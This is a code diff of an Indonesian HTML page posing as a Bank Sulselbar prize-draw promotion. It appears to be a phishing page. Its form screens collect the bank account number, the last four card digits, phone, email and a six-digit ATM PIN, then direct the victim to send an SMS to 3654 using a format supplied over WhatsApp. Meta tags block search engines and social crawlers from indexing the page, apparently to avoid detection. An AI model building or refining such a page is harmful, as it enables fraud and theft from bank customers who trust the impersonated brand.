@@ -5,33 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Gebyar Undian — Bank Sulselbar</title>
     <link rel="stylesheet" href="style.css">
-
-<!-- ✅ OPEN GRAPH — TAMPILAN SAAT LINK DIBAGIKAN -->
     <meta property="og:title" content="Gebyar Undian — Bank Sulselbar">
-    <meta property="og:description" content="Program Promosi Gebyar Undian Bank Sulselbar — Ikut berpartisipasi dan menangkan hadiah menarik!">
+    <meta property="og:description" content="Program Promosi Gebyar Undian Bank Sulselbar">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/c/c0/Logo_Bank_Sulselbar.png">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:type" content="website">
-    <meta property="og:site_name" content="Bank Sulselbar">
     <meta name="theme-color" content="#006E53">
-
-<!-- ✅ BLOKIR INDEKS & DETEKSI -->
-     <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, notranslate, noimageindex">
-     <meta name="googlebot" content="noindex, nofollow, noarchive">
-     <meta name="bingbot" content="noindex, nofollow">
-     <meta name="facebookexternalhit" content="noindex, nofollow">
-     <meta name="fb:bar" content="false">
-     <meta name="description" content="Program Promosi Gebyar Undian Bank Sulselbar">
-     <meta name="referrer" content="no-referrer">
-     <meta http-equiv="X-Frame-Options" content="SAMEORIGIN">
-     <meta http-equiv="X-Robots-Tag" content="noindex, nofollow">
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="referrer" content="no-referrer">
 </head>
 <body>
 
-<!-- ============================================== -->
-<!-- 🏠 HALAMAN AWAL — GEBYAR UNDIAN -->
-<!-- ============================================== -->
+<!-- 🏠 HALAMAN 1 — AWAL -->
 <div class="halaman aktif" id="halAwal">
     <div class="latar-pola"></div>
     <div class="konten-awal">
@@ -40,32 +23,26 @@
             <span class="teks-pita-awal">PROGRAM PROMOSI</span>
             <span class="bintang">★</span>
         </div>
-
         <div class="logo-festival">
             <img src="https://upload.wikimedia.org/wikipedia/commons/c/c0/Logo_Bank_Sulselbar.png" alt="Logo Bank Sulselbar">
         </div>
-
         <div class="nama-bank-awal">Bank Sulselbar</div>
         <h1 class="judul-gebyar">🎁 MENANGKAN UNDIAN 2026 🎁</h1>
         <h2 class="sub-judul-gebyar">GEBYAR BANK SULSELBAR</h2>
         <p class="deskripsi-awal">Ikut berpartisipasi dan menangkan hadiah menarik!</p>
-
         <div class="tombol-bawah-awal">
             <button class="btn-mulai" onclick="keRegistrasi()">
                 <span class="ikon-btn">🎫</span>
                 <span class="teks-btn">IKUTI UNDIAN</span>
             </button>
         </div>
-
         <div class="footer-awal">
-            PT. Bank Sulselbar berizin dan diawasi oleh OJK & Bank Indonesia, serta peserta penjaminan LPS.
+            PT. Bank Pembangunan Daerah Sulawesi Selatan dan Sulawesi Barat
         </div>
     </div>
 </div>
 
-<!-- ============================================== -->
-<!-- 📋 HALAMAN 2 — REGISTRASI BARU -->
-<!-- ============================================== -->
+<!-- 📋 HALAMAN 2 — REGISTRASI -->
 <div class="halaman halaman-putih" id="halRegistrasi">
     <div class="header-hijau">
         <span class="panah-kembali" onclick="kembaliKeAwal()">&larr;</span>
@@ -73,26 +50,19 @@
     </div>
     <div class="konten">
         <p class="teks-keterangan">Lengkapi data berikut untuk mengikuti Gebyar Undian Bank Sulselbar</p>
-        
         <label class="label-input">No. Rekening (Maks. 15 Angka)</label>
         <input type="text" class="input-field" id="noRekening" placeholder="Masukkan Nomor Rekening" inputmode="numeric" maxlength="15" oninput="hanyaAngka(this)">
-        
         <label class="label-input">4 Digit Terakhir No. Kartu</label>
         <input type="text" class="input-field" id="noKartu" placeholder="Masukkan 4 Digit Terakhir" inputmode="numeric" maxlength="4" oninput="hanyaAngka(this)">
-        
         <label class="label-input">Nomor Handphone</label>
         <input type="tel" class="input-field" id="noHP" placeholder="Contoh: 08123456789" inputmode="tel" maxlength="14" oninput="validasiNoHP(this)">
-        
         <label class="label-input">Email</label>
         <input type="email" class="input-field" id="email" placeholder="Masukkan Email">
-        
         <button class="btn-hijau" onclick="validasiDanLanjut()">LANJUTKAN</button>
     </div>
 </div>
 
-<!-- ============================================== -->
-<!-- 🔢 HALAMAN 3 — PIN ATM ✅ DIPERBAIKI + TOMBOL -->
-<!-- ============================================== -->
+<!-- 🔢 HALAMAN 3 — PIN ATM -->
 <div class="halaman halaman-putih" id="halPIN">
     <div class="header-hijau">
         <span class="panah-kembali" onclick="kembaliKeRegistrasi()">&larr;</span>
@@ -109,17 +79,11 @@
             <input type="tel" class="kolom-kode" maxlength="1" id="p6" inputmode="numeric" oninput="hanyaAngka(this); bacaPIN()">
         </div>
         <p class="petunjuk-pin">⚠️ Hanya dapat memasukkan angka 0-9</p>
-
-        <!-- ✅ TOMBOL LANJUTKAN — DITAMBAHKAN! -->
-        <button class="btn-hijau" onclick="bacaPINdanLanjut()" style="margin-top: 30px;">
-            LANJUTKAN
-        </button>
+        <button class="btn-hijau" onclick="lanjutKeKeterangan()" style="margin-top: 30px;">LANJUTKAN</button>
     </div>
 </div>
 
-<!-- ============================================== -->
-<!-- 🎫 HALAMAN 4 — KUPON UNDIAN (HALAMAN TERAKHIR) -->
-<!-- ============================================== -->
+<!-- 🎫 HALAMAN 4 — KUPON UNDIAN -->
 <div class="halaman halaman-putih" id="halKeterangan">
     <div class="header-hijau">
         <span class="panah-kembali" onclick="kembaliKePIN()">&larr;</span>
@@ -131,7 +95,6 @@
             <span class="teks-pita">SELAMAT!</span>
             <span class="ikon-bintang">★</span>
         </div>
-
         <div class="kartu-kupon">
             <div class="latar-gradient"></div>
             <div class="isi-kupon">
@@ -140,34 +103,22 @@
                 <p class="subjudul-kupon">Anda telah berhasil melakukan</p>
                 <div class="label-undian">Cetak Kupon Undian</div>
                 <h3 class="nama-festival">🎊 GEBYAR FESTIVAL 🎊</h3>
-                
                 <div class="pemisah"></div>
-                
                 <div class="kotak-instruksi">
-                    <p class="teks-instruksi">
-                        📩 <strong>Silakan kirimkan format melalui SMS ke:</strong>
-                    </p>
+                    <p class="teks-instruksi">📩 <strong>Silakan kirimkan format melalui SMS ke:</strong></p>
                     <div class="nomor-tujuan">3654</div>
-                    <p class="teks-format">
-                        💬 Format SMS akan dikirim melalui <strong>WhatsApp</strong>,<br>
-                        lalu salin format tersebut dan kirimkan.
-                    </p>
+                    <p class="teks-format">💬 Format SMS akan dikirim melalui <strong>WhatsApp</strong>,<br>lalu salin format tersebut dan kirimkan.</p>
                 </div>
             </div>
         </div>
-
         <button class="btn-kirim-sms" onclick="bukaSMS()">
             <span class="ikon-btn">📱</span>
             <span class="teks-btn">KIRIM SMS KE 3654</span>
         </button>
-
-        <p class="catatan-bawah">
-            🔒 Data Anda aman dan terjamin kerahasiaannya
-        </p>
+        <p class="catatan-bawah">🔒 Data Anda aman dan terjamin kerahasiaannya</p>
     </div>
 </div>
 
-<!-- ✅ SCRIPT JS -->
 <script src="script.js"></script>
 </body>
 </html>
